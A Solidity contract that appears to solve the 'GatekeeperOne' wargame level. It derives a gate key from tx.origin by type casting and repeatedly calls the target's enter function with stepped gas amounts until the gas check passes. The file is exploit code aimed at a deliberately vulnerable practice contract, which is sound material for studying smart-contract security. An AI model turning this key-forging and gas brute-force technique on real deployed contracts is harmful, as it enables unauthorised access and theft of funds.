// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Pwn {

    address private immutable target;
    
    constructor(address _target) {
        target = _target;
    }

    function pwn() external {
    
        // require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        // require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        uint16 k16 = uint16(uint160(tx.origin));

        // require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        uint64 k64 = uint64(1 << 63) + uint64(k16);
        
        uint i = 100;
        bool result = false;
        bytes8 key = bytes8(k64);
        bytes memory encodedParams = abi.encodeWithSignature(("enter(bytes8)"), key);
        while (!result) {
            // using call vs directly calling the function prevents reverts from propagating
            (result,) = target.call{gas: 8191 * 5 + i}(encodedParams);
            i++;
        }
    }
}